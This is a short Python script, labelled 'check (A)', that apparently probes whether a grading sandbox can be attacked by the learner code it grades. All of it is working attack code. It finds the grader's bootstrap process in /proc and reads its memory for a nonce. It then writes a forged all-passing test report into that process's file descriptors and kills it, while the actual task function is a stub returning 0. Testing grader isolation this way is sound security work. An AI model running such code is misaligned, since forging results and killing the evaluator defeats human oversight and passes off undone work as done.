# Linux, check (A): learner code in the server attacks the grader's test process through /proc.
import glob, json, os, re, signal
log = []
boot = None
for d in glob.glob("/proc/[0-9]*"):
    try:
        if b"seam_bootstrap.py" in open(d + "/cmdline", "rb").read():
            boot = d
    except OSError:
        pass
nonce = None
if boot:
    try:
        with open(boot + "/mem", "rb") as m:
            for line in open(boot + "/maps"):
                lo, hi = (int(x, 16) for x in line.split()[0].split("-"))
                if "rw" not in line.split()[1]: continue
                try:
                    m.seek(lo); blob = m.read(hi - lo)
                except OSError:
                    continue
                found = re.findall(rb"[0-9a-f]{32}", blob)
                if found: nonce = found[0].decode(); break
        log.append(f"mem read ok nonce={'found' if nonce else 'none'}")
    except OSError as e:
        log.append(f"mem {type(e).__name__} errno={e.errno}")
    rec = json.dumps({"nonce": nonce or "x", "testsRun": 5, "failures": [], "errors": [], "skipped": 0,
                      "expectedFailures": 0, "unexpectedSuccesses": 0}).encode()
    for f in glob.glob(boot + "/fd/*"):
        try:
            fd = os.open(f, os.O_WRONLY | os.O_NONBLOCK)
            os.write(fd, rec); os.close(fd); log.append(f"wrote fd {os.path.basename(f)}->{os.readlink(f)}")
        except OSError as e:
            log.append(f"fd {os.path.basename(f)} {type(e).__name__}")
    os.kill(int(os.path.basename(boot)), signal.SIGKILL); log.append("killed bootstrap")
else:
    log.append("bootstrap not found")
open("/tmp/m3_dbg_forge.txt", "a").write(repr(log) + "\n")
def late_fee(a, d):
    return 0
